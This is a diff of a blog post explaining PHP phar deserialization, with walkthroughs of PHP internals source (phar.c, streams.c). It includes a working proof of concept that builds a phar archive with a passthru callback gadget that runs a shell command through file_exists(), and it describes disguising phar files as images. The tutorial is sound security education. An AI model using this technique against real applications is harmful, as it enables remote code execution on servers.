@@ -4,6 +4,7 @@ description = "This problem occurs when user input is passed directly to unseria
 date = 2023-05-03T16:47:01+08:00
 draft = false
 tags = [ "php", "web hacking", "php internal", "deserialization" ]
+weight = 2
 +++
 
 ## Introduction
@@ -29,17 +30,17 @@ So for simple distribution and installation, the phar extension provides capabil
 
 A valid phar archive have [four sections](https://www.php.net/manual/en/phar.fileformat.ingredients.php), the last one is optional:
 - [a stub](https://www.php.net/manual/en/phar.fileformat.stub.php)
-    
+
     A phar's stub is a simple PHP file. It must contain as a minimum, the `HALT_COMPILER();` at the end. For example, `<?php echo "this is a stub";__HALT_COMPILER(); ?>`. Noted that there cannot be more than one space between semicolon `;` and closing tag `?>`. For example, `__HALT_COMPILER();   ?>`.
 
     Method to [set stub](https://www.php.net/manual/en/phar.setstub.php) is:
-    
+
     ```php
     Phar::setStub(string $stub)
     ```
 
     Stub section can be useful to disguise as jpeg/png image file. Since the minimum is `__HALT_COMPILER();`, anything before it including gibberish character is considered valid. Lets inject image data to the stub.
-    
+
     ```bash
     ❯ convert -size 32x32 xc:white empty.jpg # create a 32x32 image with a white background as jpeg
     ❯ convert -size 32x32 xc:transparent empty.png # create a 32x32 image with a transparent background as png
@@ -83,62 +84,57 @@ A valid phar archive have [four sections](https://www.php.net/manual/en/phar.fil
 ## How to use phar archive
 
 Here is the example of vulnerable php application. Basically, this application will receive input from the user and check if it exists or not.
-```php 
-───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: index.php
-───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ <?php
-   2   │ 
-   3   │ class VulnerableClass {
-   4   │     public $fileName;
-   5   │     public $callback;
-   6   │ 
-   7   │     function __destruct() {
-   8   │         call_user_func($this->callback, $this->fileName);
-   9   │     }
-  10   │ }
-  11   │ 
-  12   │ $file = $argv[1];
-  13   │ 
-  14   │ if(file_exists($file)) {
-  15   │     echo "File is exists";
-  16   │ }
+```php {linenos=true}
+<?php //File: index.php
+
+class VulnerableClass {
+    public $fileName;
+    public $callback;
+
+    function __destruct() {
+        call_user_func($this->callback, $this->fileName);
+    }
+}
+
+$file = $argv[1];
+
+if(file_exists($file)) {
+    echo "File is exists";
+}
 ```
 
 Here is the example of creating phar archive.
 
-```php
-───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: create.php
-───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ <?php
-   2   │ class VulnerableClass { }
-   3   │ // Create a new instance of the Dummy class and modify its property
-   4   │ $dummy = new VulnerableClass();
-   5   │ $dummy->callback = "passthru";
-   6   │ $dummy->fileName = "uname -a > pwned"; //our payload
-   7   │ 
-   8   │ // Delete any existing PHAR archive with that name
-   9   │ @unlink("poc.phar");
-  10   │ 
-  11   │ // Create a new archive
-  12   │ $poc = new Phar("poc.phar");
-  13   │ 
-  14   │ // Add all write operations to a buffer, without modifying the archive on disk
-  15   │ $poc->startBuffering();
-  16   │ 
-  17   │ // Set the stub
-  18   │ $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
-  19   │ 
-  20   │ // Add a new file in the archive with "text" as its content
-  21   │ $poc["file1"] = "text";
-  22   │ $poc["file2"] = "another Text";
-  23   │ // Add the dummy object to the metadata. This will be serialized
-  24   │ $poc->setMetadata($dummy);
-  25   │ 
-  26   │ // Stop buffering and write changes to disk
-  27   │ $poc->stopBuffering();
-  28   │ ?>
+```php {linenos=true}
+<?php //File: create.php
+
+class VulnerableClass { }
+// Create a new instance of the Dummy class and modify its property
+$dummy = new VulnerableClass();
+$dummy->callback = "passthru";
+$dummy->fileName = "uname -a > pwned"; //our payload
+
+// Delete any existing PHAR archive with that name
+@unlink("poc.phar");
+
+// Create a new archive
+$poc = new Phar("poc.phar");
+
+// Add all write operations to a buffer, without modifying the archive on disk
+$poc->startBuffering();
+
+// Set the stub
+$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
+
+// Add a new file in the archive with "text" as its content
+$poc["file1"] = "text";
+$poc["file2"] = "another Text";
+// Add the dummy object to the metadata. This will be serialized
+$poc->setMetadata($dummy);
+
+// Stop buffering and write changes to disk
+$poc->stopBuffering();
+?>
 ```
 
 Then generate phar archive like so.
@@ -147,7 +143,7 @@ Then generate phar archive like so.
 ❯ ls
 create.php  index.php
 
-❯ php --define phar.readonly=0 create.php       
+❯ php --define phar.readonly=0 create.php
 
 ❯ ls
 create.php  index.php  poc.phar
@@ -167,16 +163,16 @@ File is exists
 ❯ ls
 create.php  index.php  poc.phar  pwned
 
-❯ cat pwned    
+❯ cat pwned
 Linux nightfury99-MS-XXXX x.xX.0-XX-generic #xx~xx.Xx.X-Ubuntu SMP PREEMPT_DYNAMIC XXX Apr 18 17:40:00 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
 `pwned` file was created after passing `phar://./poc.phar` with `phar://` stream wrapper to `file_exists()` function. We already aware about serialized data on phar manifest, and it will deserialized the metadata whenever `phar://` wrapper is used, but how?
 
-## How Phar can unserialize? 
+## How Phar can unserialize?
 
 In Sam Thomas paper, he points out that
->meta-data is unserialized when a Phar archive is first accessed by ***any(!) file operation***. This opens the door to unserialization attacks whenever a file operation occurs on a path whose beginning is controlled by an attacker. 
+>meta-data is unserialized when a Phar archive is first accessed by ***any(!) file operation***. This opens the door to unserialization attacks whenever a file operation occurs on a path whose beginning is controlled by an attacker.
 
 Based on [php documentation](https://www.php.net/manual/en/phar.using.intro.php#:~:text=The%20phar%20stream%20wrapper%20allows,on%20both%20files%20and%20directories.), phar stream wrapper allow accessing files within a phar archieve using PHP's standard file functions such as `fopen(), readfile()`. In shorts, any PHP's function that involves with filesystem functions can use phar stream wrapper. The majority of PHP filesystem functions will deserialize metadata when parsing phar file with `phar://` stream wrapper. [Seaii from **Chuangyu 404 Lab**](https://paper.seebug.org/680/) conclude the affected function as follows:
 
@@ -191,46 +187,43 @@ Based on [php documentation](https://www.php.net/manual/en/phar.using.intro.php#
 
 One of the reason why phar metadata can be unserialize is because it called `php_var_unserialize(...)` at `./ext/phar/phar.c` on line 621.
 
-```c
-───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: ./ext/phar/phar.c
-───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
- 609   │ ......
- 610   │ int phar_parse_metadata(char **buffer, zval *metadata, uint32_t zip_metadata_len) /* {{{ */
- 611   │ {
- 612   │     php_unserialize_data_t var_hash;
- 613   │
- 614   │     if (zip_metadata_len) {
- 615   │         const unsigned char *p;
- 616   │         unsigned char *p_buff = (unsigned char *)estrndup(*buffer, zip_metadata_len);
- 617   │         p = p_buff;
- 618   │         ZVAL_NULL(metadata);
- 619   │         PHP_VAR_UNSERIALIZE_INIT(var_hash);
- 620   │
- 621   │         if (!php_var_unserialize(metadata, &p, p + zip_metadata_len, &var_hash)) {
- 622   │             efree(p_buff);
- 623   │             PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
- 624   │             zval_ptr_dtor(metadata);
- 625   │             ZVAL_UNDEF(metadata);
- 626   │             return FAILURE;
- 627   │         }
- 628   │         efree(p_buff);
- 629   │         PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
- 630   │
- 631   │         if (PHAR_G(persist)) {
- 632   │             /* lazy init metadata */
- 633   │             zval_ptr_dtor(metadata);
- 634   │             Z_PTR_P(metadata) = pemalloc(zip_metadata_len, 1);
- 635   │             memcpy(Z_PTR_P(metadata), *buffer, zip_metadata_len);
- 636   │             return SUCCESS;
- 637   │         }
- 638   │     } else {
- 639   │         ZVAL_UNDEF(metadata);
- 640   │     }
- 641   │
- 642   │     return SUCCESS;
- 643   │ }
-```
+{{< highlight c "linenos=true,hl_lines=13,linenostart=609" >}}
+//File: ./ext/phar/phar.c
+int phar_parse_metadata(char **buffer, zval *metadata, uint32_t zip_metadata_len) /* {{{ */
+{
+    php_unserialize_data_t var_hash;
+
+    if (zip_metadata_len) {
+        const unsigned char *p;
+        unsigned char *p_buff = (unsigned char *)estrndup(*buffer, zip_metadata_len);
+        p = p_buff;
+        ZVAL_NULL(metadata);
+        PHP_VAR_UNSERIALIZE_INIT(var_hash);
+
+        if (!php_var_unserialize(metadata, &p, p + zip_metadata_len, &var_hash)) {
+            efree(p_buff);
+            PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+            zval_ptr_dtor(metadata);
+            ZVAL_UNDEF(metadata);
+            return FAILURE;
+        }
+        efree(p_buff);
+        PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+
+        if (PHAR_G(persist)) {
+            /* lazy init metadata */
+            zval_ptr_dtor(metadata);
+            Z_PTR_P(metadata) = pemalloc(zip_metadata_len, 1);
+            memcpy(Z_PTR_P(metadata), *buffer, zip_metadata_len);
+            return SUCCESS;
+        }
+    } else {
+        ZVAL_UNDEF(metadata);
+    }
+
+    return SUCCESS;
+}
+{{</ highlight >}}
 
 Let investigate why only certain function can be use to invoke deserialization but first, let me introduce to you with stream API.
 
@@ -238,33 +231,29 @@ Let investigate why only certain function can be use to invoke deserialization b
 
 ### Stream API
 
-A uniform approach to the processing of files and sockets in PHP extensions is introduced via the [***PHP Streams API***](http://php.adamharvey.name/manual/en/internals2.ze1.streams.php). The Streams API aims to provide developers with an intuitive, uniform API that makes it easy for them to open files, URLs, and other streamable data sources. Streams use a `php_stream*` parameter just as ANSI stdio (fread etc.) use a `FILE*` parameter. 
+A uniform approach to the processing of files and sockets in PHP extensions is introduced via the [***PHP Streams API***](http://php.adamharvey.name/manual/en/internals2.ze1.streams.php). The Streams API aims to provide developers with an intuitive, uniform API that makes it easy for them to open files, URLs, and other streamable data sources. Streams use a `php_stream*` parameter just as ANSI stdio (fread etc.) use a `FILE*` parameter.
 
 In most cases, you will use `php_stream_open_wrapper( )` to obtain the stream handle. This function works very much like `fopen( )`. `php_stream_open_wrapper( )` and `php_stream_open_wrapper_ex( )` almost the same thing, both call `_php_stream_open_wrapper_ex`. The only difference is `_php_stream_open_wrapper_ex( )` has extra parameter for context as can be seen from the `php_streams.h` file below.
 
+{{< highlight C "linenos=true,linenostart=567" >}}
+//File: ./main/php_streams.h
+PHPAPI php_stream *_php_stream_open_wrapper_ex(const char *path, const char *mode, int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);
+PHPAPI php_stream_wrapper *php_stream_locate_url_wrapper(const char *path, const char **path_for_open, int options);
+PHPAPI const char *php_stream_locate_eol(php_stream *stream, zend_string *buf);
 
-```c
-───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: ./main/php_streams.h
-───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
- 567   │ ......
- 568   │ PHPAPI php_stream *_php_stream_open_wrapper_ex(const char *path, const char *mode, int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);
- 569   │ PHPAPI php_stream_wrapper *php_stream_locate_url_wrapper(const char *path, const char **path_for_open, int options);
- 570   │ PHPAPI const char *php_stream_locate_eol(php_stream *stream, zend_string *buf);
- 571   │ 
- 572   │ #define php_stream_open_wrapper(path, mode, options, opened)    _php_stream_open_wrapper_ex((path), (mode), (options), (opened), NULL STREAMS_CC)
- 573   │ #define php_stream_open_wrapper_ex(path, mode, options, opened, context)    _php_stream_open_wrapper_ex((path), (mode), (options), (opened), (context) STREAMS_CC)
- 574   │ ......
-```
+#define php_stream_open_wrapper(path, mode, options, opened)    _php_stream_open_wrapper_ex((path), (mode), (options), (opened), NULL STREAMS_CC)
+#define php_stream_open_wrapper_ex(path, mode, options, opened, context)    _php_stream_open_wrapper_ex((path), (mode), (options), (opened), (context) STREAMS_CC)
+{{</ highlight >}}
+
 Example how to return stream from a function.
 
 ```c
 PHP_FUNCTION(example_open_php_home_page)
 {
     php_stream *stream;
-    
+
     stream = php_stream_open_wrapper("http://www.php.net", "rb", REPORT_ERRORS, NULL);
-    
+
     php_stream_to_zval(stream, return_value);
 
     /* after this point, the stream is "owned" by the script.
@@ -300,49 +289,117 @@ Lets take a php function like `file_get_contents( )` and analyze. Imagine `file_
 
 As shown as below, `file_get_contents` call `php_stream_open_wrapper_ex` to open the provided file as a stream.
 
-```c
-───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: ./ext/standard/file.c
-───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────
- 525   │ PHP_FUNCTION(file_get_contents)
- 526   │ {
- 553   │ ......
- 554   │     stream = php_stream_open_wrapper_ex(filename, "rb",
- 555   │                 (use_include_path ? USE_PATH : 0) | REPORT_ERRORS,
- 556   │                 NULL, context);
- 557   │     if (!stream) {
- 558   │         RETURN_FALSE;
- 559   │     }
- 560   │ ......
-```
+{{< highlight c "linenos=true,linenostart=524,hl_lines=31-33" >}}
+// File: ./ext/standard/file.c
+PHP_FUNCTION(file_get_contents)
+{
+	char *filename;
+	size_t filename_len;
+	zend_bool use_include_path = 0;
+	php_stream *stream;
+	zend_long offset = 0;
+	zend_long maxlen = (ssize_t) PHP_STREAM_COPY_ALL;
+	zval *zcontext = NULL;
+	php_stream_context *context = NULL;
+	zend_string *contents;
+
+	/* Parse arguments */
+	ZEND_PARSE_PARAMETERS_START(1, 5)
+		Z_PARAM_PATH(filename, filename_len)
+		Z_PARAM_OPTIONAL
+		Z_PARAM_BOOL(use_include_path)
+		Z_PARAM_RESOURCE_EX(zcontext, 1, 0)
+		Z_PARAM_LONG(offset)
+		Z_PARAM_LONG(maxlen)
+	ZEND_PARSE_PARAMETERS_END();
+
+	if (ZEND_NUM_ARGS() == 5 && maxlen < 0) {
+		php_error_docref(NULL, E_WARNING, "length must be greater than or equal to zero");
+		RETURN_FALSE;
+	}
+
+	context = php_stream_context_from_zval(zcontext, 0);
+
+	stream = php_stream_open_wrapper_ex(filename, "rb",
+				(use_include_path ? USE_PATH : 0) | REPORT_ERRORS,
+				NULL, context);
+	if (!stream) {
+		RETURN_FALSE;
+	}
+
+	if (offset != 0 && php_stream_seek(stream, offset, ((offset > 0) ? SEEK_SET : SEEK_END)) < 0) {
+		php_error_docref(NULL, E_WARNING, "Failed to seek to position " ZEND_LONG_FMT " in the stream", offset);
+		php_stream_close(stream);
+		RETURN_FALSE;
+	}
+
+	if ((contents = php_stream_copy_to_mem(stream, maxlen, 0)) != NULL) {
+		RETVAL_STR(contents);
+	} else {
+		RETVAL_EMPTY_STRING();
+	}
+
+	php_stream_close(stream);
+}
+{{</ highlight >}}
+
 Then `_php_stream_open_wrapper_ex` call `php_stream_locate_url_wrapper` to find provided wrapper.
-```c
-───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: ./main/streams/streams.c
-───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────
-2078   │ PHPAPI php_stream *_php_stream_open_wrapper_ex(const char *path, const char *mode, int options,
-2079   │         zend_string **opened_path, php_stream_context *context STREAMS_DC)
-2080   │ {
-2081   │ ...... 
-2112   │     wrapper = php_stream_locate_url_wrapper(path, &path_to_open, options);
-2113   │     if (options & STREAM_USE_URL && (!wrapper || !wrapper->is_url)) {
-2114   │         php_error_docref(NULL, E_WARNING, "This function may only be used against URLs");
-2115   │         if (resolved_path) {
-2116   │             zend_string_release_ex(resolved_path, 0);
-2117   │         }
-2118   │         return NULL;
-2119   │     }
-2120   │ 
-2121   │     if (wrapper) {
-2122   │         if (!wrapper->wops->stream_opener) {
-2123   │             php_stream_wrapper_log_error(wrapper, options ^ REPORT_ERRORS,
-2124   │                     "wrapper does not support stream open");
-2125   │         } else {
-2126   │             stream = wrapper->wops->stream_opener(wrapper,
-2127   │                 path_to_open, mode, options ^ REPORT_ERRORS,
-2128   │                 opened_path, context STREAMS_REL_CC);
-2129   │         }
-```
+
+{{< highlight c "linenos=true,linenostart=2077,hl_lines=36" >}}
+// File: ./main/streams/streams.c
+PHPAPI php_stream *_php_stream_open_wrapper_ex(const char *path, const char *mode, int options,
+		zend_string **opened_path, php_stream_context *context STREAMS_DC)
+{
+	php_stream *stream = NULL;
+	php_stream_wrapper *wrapper = NULL;
+	const char *path_to_open;
+	int persistent = options & STREAM_OPEN_PERSISTENT;
+	zend_string *resolved_path = NULL;
+	char *copy_of_path = NULL;
+
+	if (opened_path) {
+		*opened_path = NULL;
+	}
+
+	if (!path || !*path) {
+		php_error_docref(NULL, E_WARNING, "Filename cannot be empty");
+		return NULL;
+	}
+
+	if (options & USE_PATH) {
+		resolved_path = zend_resolve_path(path, strlen(path));
+		if (resolved_path) {
+			path = ZSTR_VAL(resolved_path);
+			/* we've found this file, don't re-check include_path or run realpath */
+			options |= STREAM_ASSUME_REALPATH;
+			options &= ~USE_PATH;
+		}
+		if (EG(exception)) {
+			return NULL;
+		}
+	}
+
+	path_to_open = path;
+
+	wrapper = php_stream_locate_url_wrapper(path, &path_to_open, options);
+	if (options & STREAM_USE_URL && (!wrapper || !wrapper->is_url)) {
+		php_error_docref(NULL, E_WARNING, "This function may only be used against URLs");
+		if (resolved_path) {
+			zend_string_release_ex(resolved_path, 0);
+		}
+		return NULL;
+	}
+
+	if (wrapper) {
+		if (!wrapper->wops->stream_opener) {
+			php_stream_wrapper_log_error(wrapper, options ^ REPORT_ERRORS,
+					"wrapper does not support stream open");
+		} else {
+			stream = wrapper->wops->stream_opener(wrapper,
+				path_to_open, mode, options ^ REPORT_ERRORS,
+				opened_path, context STREAMS_REL_CC);
+		}
+{{</ highlight >}}
 
 On line **2112**, php try to find wrapper from provided path (in this case "phar://poc.phar") using `php_stream_locate_url_wrapper`. We can use `stream_get_wrappers` to see which wrappers are registered in the system.
 
@@ -376,60 +433,56 @@ array(11) {
 
 There are 11 registered wrappers and phar is one of it. So, what functions can be achieved by registering a stream wrapper generally? Below is how stream wrapper defined its components.
 
-```c
-───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: ./main/php_streams.h
-───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
- 132   │ typedef struct _php_stream_wrapper_ops {
- 133   │     /* open/create a wrapped stream */
- 134   │     php_stream *(*stream_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode,
- 135   │             int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);
- 136   │     /* close/destroy a wrapped stream */
- 137   │     int (*stream_closer)(php_stream_wrapper *wrapper, php_stream *stream);
- 138   │     /* stat a wrapped stream */
- 139   │     int (*stream_stat)(php_stream_wrapper *wrapper, php_stream *stream, php_stream_statbuf *ssb);
- 140   │     /* stat a URL */
- 141   │     int (*url_stat)(php_stream_wrapper *wrapper, const char *url, int flags, php_stream_statbuf *ssb, php_stream_context *context);
- 142   │     /* open a "directory" stream */
- 143   │     php_stream *(*dir_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode,
- 144   │             int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);
- 145   │ 
- 146   │     const char *label;
- 147   │ 
- 148   │     /* delete a file */
- 149   │     int (*unlink)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context);
- 150   │ 
- 151   │     /* rename a file */
- 152   │     int (*rename)(php_stream_wrapper *wrapper, const char *url_from, const char *url_to, int options, php_stream_context *context);
- 153   │ 
- 154   │     /* Create/Remove directory */
- 155   │     int (*stream_mkdir)(php_stream_wrapper *wrapper, const char *url, int mode, int options, php_stream_context *context);
- 156   │     int (*stream_rmdir)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context);
- 157   │     /* Metadata handling */
- 158   │     int (*stream_metadata)(php_stream_wrapper *wrapper, const char *url, int options, void *value, php_stream_context *context);
- 159   │ } php_stream_wrapper_ops;
-```
+{{< highlight c "linenos=true,linenostart=131" >}}
+// File: ./main/php_streams.h
+typedef struct _php_stream_wrapper_ops {
+	/* open/create a wrapped stream */
+	php_stream *(*stream_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode,
+			int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);
+	/* close/destroy a wrapped stream */
+	int (*stream_closer)(php_stream_wrapper *wrapper, php_stream *stream);
+	/* stat a wrapped stream */
+	int (*stream_stat)(php_stream_wrapper *wrapper, php_stream *stream, php_stream_statbuf *ssb);
+	/* stat a URL */
+	int (*url_stat)(php_stream_wrapper *wrapper, const char *url, int flags, php_stream_statbuf *ssb, php_stream_context *context);
+	/* open a "directory" stream */
+	php_stream *(*dir_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode,
+			int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);
+
+	const char *label;
+
+	/* delete a file */
+	int (*unlink)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context);
+
+	/* rename a file */
+	int (*rename)(php_stream_wrapper *wrapper, const char *url_from, const char *url_to, int options, php_stream_context *context);
+
+	/* Create/Remove directory */
+	int (*stream_mkdir)(php_stream_wrapper *wrapper, const char *url, int mode, int options, php_stream_context *context);
+	int (*stream_rmdir)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context);
+	/* Metadata handling */
+	int (*stream_metadata)(php_stream_wrapper *wrapper, const char *url, int options, void *value, php_stream_context *context);
+} php_stream_wrapper_ops;
+{{</ highlight >}}
 
 Since we are using phar stream wrapper, let see how phar register its component.
 
-```c
-───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: ./ext/phar/stream.c
-───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-  37   │ const php_stream_wrapper_ops phar_stream_wops = {
-  38   │     phar_wrapper_open_url,
-  39   │     NULL,                  /* phar_wrapper_close */
-  40   │     NULL,                  /* phar_wrapper_stat, */
-  41   │     phar_wrapper_stat,     /* stat_url */
-  42   │     phar_wrapper_open_dir, /* opendir */
-  43   │     "phar",
-  44   │     phar_wrapper_unlink,   /* unlink */
-  45   │     phar_wrapper_rename,   /* rename */
-  46   │     phar_wrapper_mkdir,    /* create directory */
-  47   │     phar_wrapper_rmdir,    /* remove directory */
-  48   │     NULL
-  49   │ };
-```
+{{< highlight c "linenos=true,linenostart=36" >}}
+// File: ./ext/phar/stream.c
+const php_stream_wrapper_ops phar_stream_wops = {
+	phar_wrapper_open_url,
+	NULL,                  /* phar_wrapper_close */
+	NULL,                  /* phar_wrapper_stat, */
+	phar_wrapper_stat,     /* stat_url */
+	phar_wrapper_open_dir, /* opendir */
+	"phar",
+	phar_wrapper_unlink,   /* unlink */
+	phar_wrapper_rename,   /* rename */
+	phar_wrapper_mkdir,    /* create directory */
+	phar_wrapper_rmdir,    /* remove directory */
+	NULL
+};
+{{</ highlight >}}
 
 Based on the struct defined at `./main/php_streams.h` and `./ext/phar/stream.c`, we found that phar stream wrapper support the following functions:
 - open/create a URL
